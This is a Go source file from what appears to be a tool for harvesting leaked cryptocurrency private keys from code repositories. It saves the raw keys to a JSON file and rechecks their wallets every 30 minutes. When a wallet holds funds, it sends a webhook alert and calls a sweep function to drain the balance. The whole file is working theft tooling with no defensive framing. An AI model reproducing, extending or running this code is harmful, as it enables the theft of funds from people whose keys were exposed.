package main

import (
	"context"
	"encoding/json"
	"os"
	"sync"
	"time"
)

type StoredWallet struct {
	RawKey  string `json:"raw_key"`
	Chain   string `json:"chain"`
	ETHAddr string `json:"eth_addr,omitempty"`
	AddedAt int64  `json:"added_at"`
}

var (
	storedWallets []StoredWallet
	storeMu       sync.Mutex
	storePath     = "found_wallets.json"
)

func loadStoredWallets() {
	storeMu.Lock()
	defer storeMu.Unlock()
	data, err := os.ReadFile(storePath)
	if err != nil {
		storedWallets = nil
		return
	}
	json.Unmarshal(data, &storedWallets)
	logger.Printf("[store] loaded %d previously-found wallets for recheck", len(storedWallets))
}

func saveStoredWallets() {
	data, err := json.Marshal(storedWallets)
	if err != nil {
		return
	}
	os.WriteFile(storePath, data, 0644)
}

func addStoredWallet(key FoundKey, ethAddr string) {
	storeMu.Lock()
	defer storeMu.Unlock()
	for _, w := range storedWallets {
		if w.RawKey == key.Raw && w.Chain == key.Chain {
			return
		}
	}
	storedWallets = append(storedWallets, StoredWallet{
		RawKey:  key.Raw,
		Chain:   key.Chain,
		ETHAddr: ethAddr,
		AddedAt: time.Now().Unix(),
	})
	saveStoredWallets()
}

func removeStoredWallet(rawKey, chain string) {
	storeMu.Lock()
	defer storeMu.Unlock()
	for i, w := range storedWallets {
		if w.RawKey == rawKey && w.Chain == chain {
			storedWallets = append(storedWallets[:i], storedWallets[i+1:]...)
			saveStoredWallets()
			return
		}
	}
}

func recheckLoop(ctx context.Context, cfg *Config) {
	ticker := time.NewTicker(30 * time.Minute)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			recheckWallets(ctx, cfg)
		}
	}
}

func recheckWallets(ctx context.Context, cfg *Config) {
	storeMu.Lock()
	wallets := make([]StoredWallet, len(storedWallets))
	copy(wallets, storedWallets)
	storeMu.Unlock()

	logger.Printf("[recheck] re-checking %d stored wallets for new funds", len(wallets))

	for _, w := range wallets {
		select {
		case <-ctx.Done():
			return
		default:
		}

		key := FoundKey{
			Chain:     w.Chain,
			Raw:       w.RawKey,
			Repo:      "recheck",
			CommitSHA: w.Chain,
			Verified:  true,
		}

		addrs, err := DeriveAddresses(key)
		if err != nil {
			logger.Printf("[recheck] derive error for key: %v", err)
			continue
		}

		balances, err := CheckBalances(ctx, addrs, cfg)
		if err != nil {
			logger.Printf("[recheck] balance check error: %v", err)
			continue
		}

		funded := false
		for _, b := range balances {
			if !b.HasFunds {
				continue
			}
			funded = true
			logger.Printf("[recheck] %s at %s now HAS FUNDS: %s", b.Chain, b.Address, b.BalanceHuman)
			if cfg.WebhookURL != "" {
				notify(ctx, key, b, cfg.WebhookURL)
			}
			sweep(ctx, key, b, addrs, cfg)
		}

		if funded {
			removeStoredWallet(w.RawKey, w.Chain)
		}

		select {
		case <-ctx.Done():
			return
		case <-time.After(2 * time.Second):
		}
	}
}
